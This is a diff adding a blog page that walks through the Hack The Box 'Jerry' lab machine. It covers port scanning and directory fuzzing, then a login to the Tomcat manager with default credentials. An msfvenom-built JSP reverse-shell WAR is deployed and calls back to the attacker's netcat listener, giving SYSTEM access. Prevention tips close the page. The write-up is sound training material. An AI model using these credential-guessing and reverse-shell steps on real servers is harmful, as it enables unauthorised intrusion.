@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en" class="dark-theme">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Detailed write-up of the Jerry machine from Hack The Box, focusing on file upload exploitation">
+    <meta property="og:title" content="HTB Jerry write-up">
+    <meta property="og:description" content="Detailed write-upof the Jerry machine from Hack The Box, focusing on SMB vulnerability exploitation">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bb4go.github.io/writeups/writeup1.html">
+    <link rel="canonical" href="https://bb4go.github.io/writeups/writeup1.html">
+    <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml">
+    <link rel="stylesheet" href="../css/style.css">
+    <title>HTB Jerry Walkthrough - b4go</title>
+</head>
+<body>
+    <header>
+        <div class="header-content container">
+            <div class="logo">
+                <a href="../index.html">b4go</a>
+            </div>
+            <nav class="main-nav">
+                <button class="mobile-menu-toggle" aria-label="Toggle menu">
+                    <span></span>
+                    <span></span>
+                    <span></span>
+                </button>
+                <ul class="nav-list">
+                    <li><a href="../index.html">Home</a></li>
+                    <li><a href="../projects.html">Projects</a></li>
+                    <li class="active"><a href="../writeups.html">Write-ups</a></li>
+                    <li><a href="../about.html">About Me</a></li>
+                    <li>
+                        <button class="theme-toggle" aria-label="Toggle theme">
+                            <svg class="sun-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line></svg>
+                            <svg class="moon-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+                        </button>
+                    </li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main>
+        <article class="content-with-nav">
+            <div class="container">
+                <div class="article-header">
+                    <h1>Jerry</h1>
+                    <div class="meta">
+                        <span class="date">Published: Apr 14, 2025</span>
+                        <div class="tags">
+                            <span class="tag">#htb</span>
+                                <span class="tag">#oscp</span>
+                                <span class="tag">#windows</span>
+                                <span class="tag">#easy</span>
+                                <span class="tag">#tomcat</span>
+                        </div>
+                    </div>
+                </div>
+                <div id="reading-time" class="reading-time"></div>
+
+              
+                  
+
+                  
+                   
+                <div class="content-layout">
+                    <div class="main-content">
+                        <section id="introduction" class="content-section">
+                            <h2>Introduction</h2>
+                            <br>
+                            <p>Although Jerry is one of the easier machines on Hack The Box, it drops you into an enterprise-style setup with a familiar web interface, runs on Windows and it is realistic as Apache Tomcat is often found exposed and configured with common or weak credentials.</p>
+                            
+                            
+                        </section>
+
+                        <section id="recon" class="content-section">
+                            <h2>Recon</h2>
+                            <h3>Initial Port Scan</h3>
+                            <p>I started by conducting a port scan using Nmap to identify open ports and services running on the target:</p>
+                            
+                            <div class="code-block">
+                                <button class="copy-btn">📋 Copy</button>
+                                <pre><code>b4go@parrot:~/HTB/Jerry $ nmap -sCV -p- --open -oA jerry 10.10.10.95 -Pn
+                                    Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-14 10:09 CEST
+                                    Nmap scan report for 10.10.10.95
+                                    Host is up (0.047s latency).
+                                    Not shown: 65534 filtered tcp ports (no-response)
+                                    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+                                    PORT     STATE SERVICE VERSION
+                                    8080/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
+                                    |_http-open-proxy: Proxy might be redirecting requests
+                                    |_http-favicon: Apache Tomcat
+                                    |_http-server-header: Apache-Coyote/1.1
+                                    |_http-title: Apache Tomcat/7.0.88
+                                    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+                                    Nmap done: 1 IP address (1 host up) scanned in 117.13 seconds</code></pre>
+                              </div>
+                              
+                            
+                            <h3>Service Enumeration</h3>
+                            <p>The only port we see open is the 8080 so let's check that first:</p>
+                            
+                           <img src="../boximages/jerry/Pasted image 20250414101901.png">
+                        </section>
+                        <section id="enumeration" class="content-section">
+                            <h2>Vulnerability Enumeration</h2>
+                            <h3>Searchsploit</h3>
+                            <p>I noticed it is a Tomcat 7.0.88 so my first thought is to have a look if there is any exploit for the version since Tomcat last version is 11.0.6 we are working with an old version:</p>
+                            
+                          
+                            <div class="code-block">
+                                <button class="copy-btn">📋 Copy</button>
+                                <pre><code>b4go@parrot:~/HTB/Jerry $ searchsploit tomcat 7.0.88
+                                    ------------------------------------------------------------------------------------------- ---------------------------------
+                                     Exploit Title                                                                             |  Path
+                                    ------------------------------------------------------------------------------------------- ---------------------------------
+                                    Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote  | windows/webapps/42953.txt
+                                    Code Execution (1)                                                                         | 
+                                    Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - JSP Upload Bypass / Remote  | jsp/webapps/42966.py
+                                    Code Execution (2)                                                                         |
+                                    ------------------------------------------------------------------------------------------- ---------------------------------
+                                    Shellcodes: No Results</code></pre>
+                              </div>
+                              
+                            
+                            <p>It won't work for now since we can't upload files yet.</p>
+                            <div class="magnifier-container">
+                                <img src="../boximages/jerry/Pasted image 20250414110710.png">
+                              </div>
+                              
+                            <h3>Fuzzing</h3>
+                            <p>I will fuzz and look if I see something:
+                                </p>
+                            
+                                <div class="code-block">
+                                    <button class="copy-btn">📋 Copy</button>
+                                    <pre><code>b4go@parrot:~/HTB/Jerry $ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.10.95:8080/FUZZ
+                                        ---------------------------------------------------------------
+ :: Method           : GET
+ :: URL              : http://10.10.10.95:8080/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+---------------------------------------------------------------
+
+#                     [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 55ms]
+# directory-list-2.3-small.txt [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 55ms]
+# Priority-ordered case-sensitive list, where entries were found [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 56ms]
+# Copyright 2007 James Fisher [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 55ms]
+# or send a letter to Creative Commons, 171 Second Street, [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 58ms]
+#                     [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 58ms]
+#                     [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 99ms]
+# of at least 3 different hosts [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 99ms]
+# Attribution-Share Alike 3.0 License. To view a copy of this [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 100ms]
+# Suite 300, San Francisco, California, 94105, USA. [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 99ms]
+# license, visit http://creativecommons.org/licenses/by-sa/3.0/ [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 100ms]
+#                     [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 100ms]
+#                     [Status: 200, Size: 11398, Words: 4248, Lines: 202, Duration: 100ms]
+manager               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 96ms]
+manager/              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 47ms]
+manager/html          [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 49ms]
+manager/status        [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 50ms]
+
+:: Progress: [41417/87664] :: Job [1/1] :: 1020 req/sec :: Duration: [00:00:54] :: Errors: 0 ::</code></pre>
+                                  </div>
+                            
+                            <p> There is a manager page that requests basic authentication, we don't have credentials so we try the typical root:root, admin:admin...</p>
+                            <img src="../boximages/jerry/Pasted image 20250414110950.png">
+                            <br>
+                            <p>Eventually we get 403 access denied due to too many failed logins but we are able to spot leaked credentials here</p>
+
+                            <img src="../boximages/jerry/Pasted image 20250414111124.png">
+                            <br>
+                            <p>We login with tomcat:s3cret and we are in</p>
+                            
+                            <img src="../boximages/jerry/Pasted image 20250414111338.png">
+
+                            
+                        </section>
+
+                        <section id="exploitation" class="content-section">
+                            <h2>Exploitation</h2>
+                            <h3>Warbitrary File Upload
+                            </h3>
+                            <p>Since we are able to upload war file, we just try it and see what happens</p>
+                            <br>
+                            <p>We first create a shell with msfvenom</p>
+                            <div class="code-block">
+                                <button class="copy-btn">📋 Copy</button>
+                                <pre><code>b4go@parrot:~/HTB/Jerry $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.4 LPORT=4443 -f war > backup.war
+                                    Payload size: 1089 bytes
+                                    Final size of war file: 1089 bytes
+                                </code></pre>
+                              </div>
+                            <p>Set up a listener to receive the connection</p>
+                            <div class="code-block">
+                                <button class="copy-btn">📋 Copy</button>
+                                <pre><code>b4go@parrot:~/HTB/Jerry $ nc -lvnp 4443
+                                    listening on [any] 4443 ...
+                                </code></pre>
+                              </div>
+                            <p>In the /manager page we select browse and deploy in order to upload our backup.war previously created. </p>
+                            <br>
+                            <img src="../boximages/jerry/Pasted image 20250414112229.png">
+                            <br>
+                            <p>Simply click on the /backup application to execute the shell and we are in, surprisingly as root already</p>
+                            <div class="code-block">
+                                <button class="copy-btn">📋 Copy</button>
+                                <pre><code>b4go@parrot:~/HTB/Jerry$ nc -lvnp 4443
+                                    listening on [any] 4443 ...
+                                    connect to [10.10.14.4] from (UNKNOWN) [10.10.10.95] 49193
+                                    Microsoft Windows [Version 6.3.9600]
+                                    (c) 2013 Microsoft Corporation. All rights reserved.
+                                    
+                                    C:\apache-tomcat-7.0.88>whoami
+                                    whoami
+                                    nt authority\system
+                                    
+                                    C:\apache-tomcat-7.0.88>
+                                    
+                                </code></pre>
+                              </div>
+                              <p>And with this we can retrieve both flags at once:</p>
+                              <br>
+                              <img src="../boximages/jerry/Pasted image 20250414112631.png">
+                           
+                        </section>
+                        <section id="conclusion" class="content-section">
+                            <h2>Conclusion</h2>
+                            <p>Jerry was a straightforward box that showcased the risks of running outdated software with weak or default credentials. By accessing the Tomcat manager with leaked creds and uploading a WAR shell, we quickly gained SYSTEM-level access.
+                            
+                            <h3>Prevention:</h3>
+                            <ul>
+                                <li>Keeping Tomcat updated </li>
+                                <li>Disabling the manager interface in production.</li>
+                                <li>Enforcing strong credentials</li>
+                                <li>Restrict file uploads</li>
+                            </ul>
+                            
+                            
+                        </section>
+                    </div>
+
+                    <aside class="content-nav">
+                        <nav class="scrollspy-nav">
+                            <ul>
+                                <li><a href="#introduction" class="active">Introduction</a></li>
+                                <li><a href="#recon">Recon</a></li>
+                                <li><a href="#enumeration">Vulnerability Enumeration</a></li>
+                                <li><a href="#exploitation">Exploitation</a></li>
+                                <li><a href="#conclusion">Conclusion</a></li>
+                            </ul>
+                        </nav>
+                    </aside>
+                </div>
+            </div>
+        </article>
+    </main>
+
+    <button id="back-to-top" aria-label="Back to top">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></svg>
+    </button>
+
+    <footer>
+        <div class="container">
+            <div class="footer-content">
+                <div class="social-links">
+                    <a href="https://github.com/bb4go/" aria-label="GitHub">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path></svg>
+                    </a>
+                    </a>
+                    <a href="rss.xml" aria-label="RSS Feed">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg>
+                    </a>
+                    <a href="mailto:b4go@protonmail.com" aria-label="mail">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
+                        viewBox="0 0 24 24" fill="none" stroke="currentColor" 
+                        stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <rect x="3" y="5" width="18" height="14" rx="2" ry="2"></rect>
+                        <polyline points="3 7 12 13 21 7"></polyline>
+                        </svg>
+                    </a>
+                    <a href="https://buymeacoffee.com/b4go" aria-label="Buy Me a Coffee" target="_blank" rel="noopener">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" 
+                             viewBox="0 0 24 24" fill="none" stroke="currentColor" 
+                             stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                          <path d="M18 8h1a4 4 0 0 1 0 8h-1" />
+                          <path d="M2 8h16v5a4 4 0 0 1-4 4H6a4 4 0 0 1-4-4Z" />
+                          <line x1="6" y1="2" x2="6" y2="4" />
+                          <line x1="10" y1="2" x2="10" y2="4" />
+                          <line x1="14" y1="2" x2="14" y2="4" />
+                        </svg>
+                      </a>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+
+    <script src="../js/theme.js"></script>
+    <script src="../js/scrollspy.js"></script>
+    <script src="../js/main.js"></script>
+    <script src="../js/adventure-mode.js"></script>
+    <script src="../js/read.js"></script>
+    <script src="../js/copy.js"></script>
+
+</body>
+</html>
